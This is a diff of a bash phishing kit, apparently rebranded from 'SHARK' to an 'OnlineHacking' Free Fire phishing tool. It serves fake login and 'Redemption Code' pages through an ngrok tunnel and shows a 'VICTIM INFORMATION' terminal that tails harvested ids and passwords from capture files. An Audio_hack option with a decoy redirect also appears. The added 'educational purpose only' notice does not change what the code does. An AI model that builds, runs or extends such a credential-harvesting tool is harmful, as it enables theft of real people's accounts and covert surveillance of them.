@@ -55,19 +55,29 @@ SUMAN ©\e[34m
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
-ONLINE HACKING			  
-							  							  
+ONLINE HACKING			  							  							  
           \e[m"
+	  
+echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
+  
+echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"
+
+echo -e " \e[97mTelegram : \e[0m\e[95mhttps://t.me/OnlineHacKing \e[0m\n"
+
+echo -e " \e[34mFacebook Page : \e[0m\e[31mhttps://www.facebook.com/AdminOnlineHacKing \e[0m\n"
+
+echo -e " \e[93mInstagram : \e[0m\e[92mhttps://www.instagram.com/suman333mondal_/ \e[0m\n"
+
 }
 
 
 echo 
 echo 
-echo -e "\e[31m[\e[32m★\e[31m]\e[32m CONNECT TO STABLE INTERNET CONNECTION\e[m "
+echo -e "\e[31m[\e[32m★\e[31m]\e[32mThis Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
 sleep 2
 echo 
 echo 
-echo -en "\e[31m[\e[32m*\e[31m]\e[32m HAVE YOU CONNECTED TO IT (y/n)? \e[m "
+echo -en "\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice (y/n)? \e[m "
 read ans
 if [ "$ans" != "${ans#[Yy]}" ]; then
 echo 
@@ -206,13 +216,13 @@ kill -9 $ngrok
 while :
 do
 clear
-echo -e "\e[33m    
-      ██████╗ ██╗   ██╗██████╗  ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
-      ██╔══██╗██║   ██║██╔══██╗██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
-      ██████╔╝██║   ██║██████╔╝██║  ███╗█████╗███████║███████║██║     █████╔╝ 
-      ██╔═══╝ ██║   ██║██╔══██╗██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗ 
-      ██║     ╚██████╔╝██████╔╝╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
-      ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\e[93;1m v 2.0\e[0m\n"
+echo -e "\e[33m     
+  ███████╗██████╗ ███████╗███████╗    ███████╗██╗██████╗ ███████╗ 
+  ██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║██╔══██╗██╔════╝ 
+  █████╗  ██████╔╝█████╗  █████╗█████╗█████╗  ██║██████╔╝█████╗   
+  ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝╚════╝██╔══╝  ██║██╔══██╗██╔══╝   
+  ██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗ 
+  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ \e[93;1m v 2.0\e[0m\n"  
 echo -e "\e[95m
          ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
         ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
@@ -227,6 +237,9 @@ echo -e "\e[95m
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
+    
+    echo -e " \e[36mOriginal GitHub : \e[0m\e[92mhttps://github.com/OnlineHacKing/FreeFire-Phishing \e[0m\n"
+    
 echo ""
 echo -e $'\e[1;32m        =======================================         \e[0m'
 echo -e $'        \e[1;37;41m    c r e a t e d  b y  S u m a n    \e[m '
@@ -235,27 +248,15 @@ echo ""
 banner(){
 echo -e "\e[1;96m==================================================================\e[m "
 echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mBest Page \e[33mDont Use admin not active this page\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n" 
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;31m[\e[0m\e[1;92m14\e[0m\e[1;31m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;31m[\e[0m\e[1;92m25\e[0m\e[1;31m] \e[0m\e[1;37;40mProtonmail\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mRedemption Code\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;31m[\e[0m\e[1;92m15\e[0m\e[1;31m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;31m[\e[0m\e[1;92m26\e[0m\e[1;31m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n" 
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;31m[\e[0m\e[1;92m16\e[0m\e[1;31m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;31m[\e[0m\e[1;92m27\e[0m\e[1;31m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n"  
-echo
-printf "\e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;31m[\e[0m\e[1;92m17\e[0m\e[1;31m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;31m[\e[0m\e[1;92m28\e[0m\e[1;31m] \e[0m\e[1;48;5;129mTwitch\e[0m\n"           
-echo
-printf "\e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;31m[\e[0m\e[1;92m18\e[0m\e[1;31m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;31m[\e[0m\e[1;92m29\e[0m\e[1;31m] \e[0m\e[1;48;5;236mAJIO\e[0m\n"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;31m[\e[0m\e[1;92m19\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;31m[\e[0m\e[1;92m30\e[0m\e[1;31m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n"   
-echo
-printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n"
 echo " "
 echo -e "\e[1;96m==================================================================\e[m "
 }
@@ -306,7 +307,7 @@ ash1() {
          if [ $option = 01 ] || [ $option = 1 ]
          then
 	                    cd /usr/bin/phs
-                            cd facebook/
+                            cd suman/
                             echo 
 			    connection
 			    ( sleep 5 ) &> /dev/null & spin_shark
@@ -324,22 +325,22 @@ ash1() {
 			    ( sleep 6 ) &> /dev/null & spinner1                                                                                                              
 			    ash 
 			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			    xterm -T "SHARK MOST ADVANCE PHISHING" -geometry 110x35 -e '
+			    xterm -T "ONLINEHACKING MOST ADVANCE PHISHING" -geometry 110x35 -e '
 			    ./shark_logo
 			    echo 
 			    echo -e "\e[96m==================================\e[92m VICTIM INFORMATION \e[96m=================================== \e[93m"  
 			    echo 
-			    echo -e "\e[96m==================================\e[92m    SHARK © 2020    \e[96m===================================\e[92m"
+			    echo -e "\e[96m==================================\e[92m    SUMAN © 2021    \e[96m===================================\e[92m"
 			    echo
-			    touch usernames.txt >> /dev/null 2>&1
-			    tail -f usernames.txt '
+			    touch pass.txt >> /dev/null 2>&1
+			    tail -f pass.txt '
 			    
 			    break;
 			     
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
 			   cd /usr/bin/phs
-                           cd pinterest/
+                           cd Redemption-Code/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -357,14 +358,14 @@ ash1() {
                            ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			   xterm -T "SHARK MOST ADVANCE PHISHING" -geometry 110x35 -e '
+			   xterm -T "ONLINEHACKING MOST ADVANCE PHISHING" -geometry 110x35 -e '
 			   ./shark_logo
 			   echo 
 			   echo -e "\e[96m==================================\e[92m VICTIM INFORMATION \e[96m=================================== \e[93m"  
 			   echo 
-			   echo -e "\e[96m==================================\e[92m    SHARK © 2020    \e[96m=================================== \e[92m"
+			   echo -e "\e[96m==================================\e[92m    SUMAN © 2021    \e[96m=================================== \e[92m"
                            echo 
-                           tail -f log.txt | grep -e "id" -e "password"  '
+                           tail -f onlinehacking.txt | grep -e "id" -e "password"  '
 
                            break;
 
@@ -1402,8 +1403,8 @@ ash1() {
 			  cd Audio_hack
 			  file_check1
 			  echo
-			  default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
-                          printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m https://youtube.com\e[0m\e[1;92m ): \e[0m" $default_redirect
+			  default_redirect="https://www.onlinehacking.xyz"
+                          printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m https://www.onlinehacking.xyz\e[0m\e[1;92m ): \e[0m" $default_redirect
                           read redirect_link
                           redirect_link="${redirect_link:-${default_redirect}}"
 			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
